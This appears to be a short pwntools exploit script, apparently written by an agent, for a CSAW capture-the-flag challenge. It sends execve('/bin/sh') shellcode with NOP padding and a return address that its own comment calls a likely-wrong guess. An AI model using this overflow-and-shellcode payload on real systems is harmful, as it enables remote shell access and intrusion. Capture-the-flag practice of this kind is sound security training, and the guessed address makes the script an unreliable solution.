from pwn import *

# Set context
context.arch = 'amd64'

# Connect to server
p = remote("pwn.chal.csaw.io", 8000)

# Simple execve("/bin/sh") shellcode for x86_64
shellcode = b"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x48\x89\xe7\xb0\x3b\x0f\x05"

# Buffer is 32 bytes, but we have 512 bytes of input space
# We need to find where our buffer is located on the stack
# For now, let's assume we can jump to the start of our buffer
# Padding to reach return address: 40 bytes
payload = shellcode.ljust(40, b'\x90')  # pad with NOPs
payload += p64(0x7fffffffe000)  # guess stack address - this is likely wrong

p.send(payload)
print(p.recvall(timeout=5).decode('ascii', errors='ignore'))
end_of_edit

